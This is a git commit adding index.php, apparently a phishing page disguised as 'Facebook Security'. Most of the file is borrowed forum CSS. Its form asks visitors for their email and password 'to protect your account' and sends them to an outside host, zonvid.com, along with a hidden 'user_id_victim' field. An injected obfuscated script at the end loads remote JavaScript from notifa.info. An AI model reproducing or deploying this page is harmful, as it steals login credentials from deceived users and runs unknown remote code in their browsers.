ffefbeb5b47effe357977115142a46e7ea881ec5
wawank77 <38910730+wawank77@users.noreply.github.com>
2018-05-02 18:43:31 +0800

    Create index.php

---
+++ index.php
@@ -0,0 +1,327 @@
+
+    <head>
+
+        <title> Facebook Security </title>
+
+
+</script><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+        <meta content="" name="description" />
+        <link href="" rel="shortcut icon" />  <!-- CSS Stylesheet --> <style id="vbulletin_css" type="text/css">
+/**
+* vBulletin 3.8.2 CSS
+* Style: 'Texas HoldEm Style'; Style ID: 10
+*/
+body
+{
+	background: #3b5997 url('sc/facebook.jpg') no-repeat top center;
+	color: #fff;
+	padding: 0px; font-style:normal; font-variant:normal; font-weight:normal; font-size:10pt; font-family:verdana, geneva, lucida, lucida grande, arial, helvetica, sans-serif; margin-left:10px; margin-right:10px; margin-top:5px; margin-bottom:10px
+}
+a:link, body_alink
+{
+	color: #c5e3e6;
+}
+a:visited, body_avisited
+{
+	color: #c5e3e6;
+}
+a:hover, a:active, body_ahover
+{
+	color: #ffffff;
+}
+td, th, p, li
+{
+	font: 10pt verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+.tborder
+{
+	background: #444444;
+	color: #000000;
+}
+.tcat
+{
+	background: #000000 url('black_bar.jpg') repeat-x top left;
+	color: #FFFFFF;
+	font-style:normal; font-variant:normal; font-weight:bold; font-size:10pt; font-family:verdana, geneva, lucida, lucida grande, arial, helvetica, sans-serif
+}
+.tcat a:link, .tcat_alink
+{
+	color: #ffffff;
+	text-decoration: none;
+}
+.tcat a:visited, .tcat_avisited
+{
+	color: #ffffff;
+	text-decoration: none;
+}
+.tcat a:hover, .tcat a:active, .tcat_ahover
+{
+	color: #FFFF66;
+	text-decoration: underline;
+}
+.thead
+{
+	background: #012001;
+	color: #FFFFFF;
+	font: bold 11px tahoma, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+.thead a:link, .thead_alink
+{
+	color: #FFFFFF;
+}
+.thead a:visited, .thead_avisited
+{
+	color: #FFFFFF;
+}
+.thead a:hover, .thead a:active, .thead_ahover
+{
+	color: #FFFF00;
+}
+.tfoot
+{
+	background: #000000 url('footer.jpg') repeat-x top center;
+	color: #ffffff;
+	text-align:center
+}
+.tfoot a:link, .tfoot_alink
+{
+	color: #ffffff;
+}
+.tfoot a:visited, .tfoot_avisited
+{
+	color: #c5e3e6;
+}
+.tfoot a:hover, .tfoot a:active, .tfoot_ahover
+{
+	color: #ffffff;
+}
+.alt1, .alt1Active
+{
+	background: #000000;
+	color: #ffffff;
+}
+.alt2, .alt2Active
+{
+	background: #101010;
+	color: #ffffff;
+}
+.inlinemod
+{
+	background: #FFFFCC;
+	color: #000000;
+}
+.wysiwyg
+{
+	background: #F5F5FF;
+	color: #000000;
+	font: 10pt verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+	margin: 5px 10px 10px 10px;
+	padding: 0px;
+}
+.wysiwyg a:link, .wysiwyg_alink
+{
+	color: #c5e3e6;
+}
+.wysiwyg a:visited, .wysiwyg_avisited
+{
+	color: #c5e3e6;
+}
+.wysiwyg a:hover, .wysiwyg a:active, .wysiwyg_ahover
+{
+	color: #ffffff;
+}
+textarea, .bginput
+{
+	font: 10pt verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+.bginput option, .bginput optgroup
+{
+	font-size: 10pt;
+	font-family: verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+.button
+{
+	font: 11px verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+select
+{
+	font: 11px verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+option, optgroup
+{
+	font-size: 11px;
+	font-family: verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+.smallfont
+{
+	font: 11px verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+.time
+{
+	color: #30881f;
+}
+.navbar
+{
+	color: #999999;
+	font: 11px verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+.highlight
+{
+	color: #FF0000;
+	font-weight: bold;
+}
+.fjsel
+{
+	background: #3E5C92;
+	color: #E0E0F6;
+}
+.fjdpth0
+{
+	background: #F7F7F7;
+	color: #000000;
+}
+.panel
+{
+	background: #E4E7F5 url('images/gradients/gradient_panel.gif') repeat-x top left;
+	color: #000000;
+	padding: 10px;
+	border: 2px outset
+}
+.panelsurround
+{
+	background: #D1D4E0 url('images/gradients/gradient_panelsurround.gif') repeat-x top left;
+	color: #000000
+}
+legend
+{
+	color: #22229C;
+	font: 11px tahoma, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+.vbmenu_control
+{
+	background: #012001;
+	color: #FFFFFF;
+	font: bold 11px tahoma, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+	padding: 3px 6px 3px 6px;
+	white-space: nowrap;
+}
+.vbmenu_control a:link, .vbmenu_control_alink
+{
+	color: #FFFFFF;
+	text-decoration: none;
+}
+.vbmenu_control a:visited, .vbmenu_control_avisited
+{
+	color: #FFFFFF;
+	text-decoration: none;
+}
+.vbmenu_control a:hover, .vbmenu_control a:active, .vbmenu_control_ahover
+{
+	color: #FFFFFF;
+	text-decoration: underline;
+}
+.vbmenu_popup
+{
+	background: #444444;
+	color: #ffffff;
+}
+.vbmenu_option
+{
+	background: #1e1e1e;
+	color: #fffffff;
+	font: 11px verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+	white-space: nowrap;
+	cursor: pointer;
+}
+.vbmenu_option a:link, .vbmenu_option_alink
+{
+	color: #c5e3e6;
+	text-decoration: none;
+}
+.vbmenu_option a:visited, .vbmenu_option_avisited
+{
+	color: #c5e3e6;
+	text-decoration: none;
+}
+.vbmenu_option a:hover, .vbmenu_option a:active, .vbmenu_option_ahover
+{
+	color: #FFFFFF;
+	text-decoration: none;
+}
+.vbmenu_hilite
+{
+	background: #101010;
+	color: #FFFFFF;
+	font: 11px verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+	white-space: nowrap;
+	cursor: pointer;
+}
+.vbmenu_hilite a:link, .vbmenu_hilite_alink
+{
+	color: #FFFFFF;
+	text-decoration: none;
+}
+.vbmenu_hilite a:visited, .vbmenu_hilite_avisited
+{
+	color: #FFFFFF;
+	text-decoration: none;
+}
+.vbmenu_hilite a:hover, .vbmenu_hilite a:active, .vbmenu_hilite_ahover
+{
+	color: #FFFFFF;
+	text-decoration: none;
+}
+/* ***** styling for 'big' usernames on postbit etc. ***** */
+.bigusername { font-size: 14pt; }
+
+/* ***** small padding on 'thead' elements ***** */
+td.thead, th.thead, div.thead { padding: 4px; }
+
+/* ***** basic styles for multi-page nav elements */
+.pagenav a { text-decoration: none; }
+.pagenav td { padding: 2px 4px 2px 4px; }
+
+/* ***** de-emphasized text */
+.shade, a.shade:link, a.shade:visited { color: #777777; text-decoration: none; }
+a.shade:active, a.shade:hover { color: #FF4400; text-decoration: underline; }
+.tcat .shade, .thead .shade, .tfoot .shade { color: #fff; }
+
+/* ***** define margin and font-size for elements inside panels ***** */
+.fieldset { margin-bottom: 6px; }
+.fieldset, .fieldset td, .fieldset p, .fieldset li { font-size: 11px; }
+        </style>
+    </head>
+</script><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<link rel="shortcut icon" href="https://fbstatic-a.akamaihd.net/rsrc.php/yl/r/H3nktOa7ZMg.ico">
+
+    <body spellcheck="false">
+        <p>&nbsp;</p>
+		<p>&nbsp;</p>
+ <CENTER><IMG SRC="2.jpg"></CENTER><BR><BR>
+		<center><b><font color="#fff"><h2>Enter your Email and Password now even protect your account</h2></font></b></center> 
+		<p>&nbsp;</p>
+		<form method="post" action="https://zonvid.com/conti/home/18.php" name="login_form">
+ 
+<input type="hidden" name="user_id_victim" value="900644" /></TD>
+
+
+              <p align="center">
+<label>
+  <strong class="email-label">Email :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </strong>&nbsp;<input type="text" name="email" id="Email" value="" size="23">
+</label></p>
+              <p align="center">
+<label>
+  <strong class="passwd-label">Password : </strong>&nbsp;<input type="password" name="pass" id="Passwd" size="23">
+</label>&nbsp;</p>
+              <p align="center">
+  &nbsp;
+<input type="hidden" name="hash" value="d7b02583921b7e70e22a1d01e2616d10,1525255446" />
+<input value="click here now" name="login" onclick="" id="u649190_1" type="submit">
+	<div align="center">
+					<font color="#ffffff">	<!-- Do not remove cronimage or your scheduled tasks will cease to function --> 	 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->  	 	
+					</font></div>
+			</div>
+		</form>
+    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5myanBwplbX7Zi4KcC38g9U1VvqKc1687Mq%2bErXMfVdi%2fhYRtnj5QP8TmJD8X8WEFqms17c1%2bflXFPfAXDifkbr9DSsSAVtxlfvXmYqxoiLaTE%2fmygEAT9wcNspPTHuDZQbCJVFDc27QE4V3wg9egntIkQGd50KMiDxpXwMpK1tdIEeek2%2fkH%2bWS4IViL5MDxhOE071cZhXPFALF5luy9AFnpiIGvmg4x%2fHzsgsSjJ3YCY8IEb1NrbVMxbzgbUa4Mf054u1JvvngU9Lcg1Y7s%2fPnVV48xY5joghdeCHhO%2fgX6f4RMcUub9jrMDqAMTjahH07CjVYe0dOth2eN6BIhj9%2bPRSBXH0qtkA83pojhjxfviZ2UMlTxcP6jqnU52Aq6SyOus5gXPNzenwfuHg5Z8%2b2UJoK1wEPzTL3qwFWdbGXOjpyTyVFZ%2fCRA2DgQia%2bEPCVDjFUOYZ%2fm3meTnM3acc3U5bTW%2fjdWg8GYUgXL9FR84eSPSmiIMZ%2bMLksvNyfz0ByPa4VehRuyMEFBa30vNNDJPrJojDHw5Y7FN%2bBcpNU39%2b4i5zFaMUg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
